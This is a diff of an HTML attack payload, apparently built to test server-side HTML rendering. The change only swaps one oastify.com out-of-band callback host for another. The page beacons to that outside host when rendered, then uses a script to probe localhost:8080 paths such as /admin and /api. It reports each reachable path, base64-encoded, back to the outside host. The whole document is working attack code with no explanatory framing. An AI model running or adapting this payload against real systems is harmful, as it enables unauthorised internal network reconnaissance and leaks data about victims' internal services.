@@ -9,7 +9,7 @@
 
 <body>
     <h1>Hello</h1>
-    <img src="https://v95mka1z81knecieu4spoyemadg443ss.oastify.com/?ItsRenderingHtml">
+    <img src="https://nb2em23ratmfg4k6wwuhqqgec5iw6wul.oastify.com/?ItsRenderingHtml">
     <script>
         const paths = [
             "/", "/robots.txt", "/login", "/admin", "/api", "/api/v1",
@@ -19,7 +19,7 @@
         paths.forEach(path => {
             fetch(`http://localhost:8080${path}`, { mode: "no-cors" })
                 .then(() => {
-                    fetch(`https://v95mka1z81knecieu4spoyemadg443ss.oastify.com/?hit=8080${btoa(path)}`);
+                    fetch(`https://nb2em23ratmfg4k6wwuhqqgec5iw6wul.oastify.com?hit=8080${btoa(path)}`);
                 })
                 .catch(() => { });
         });
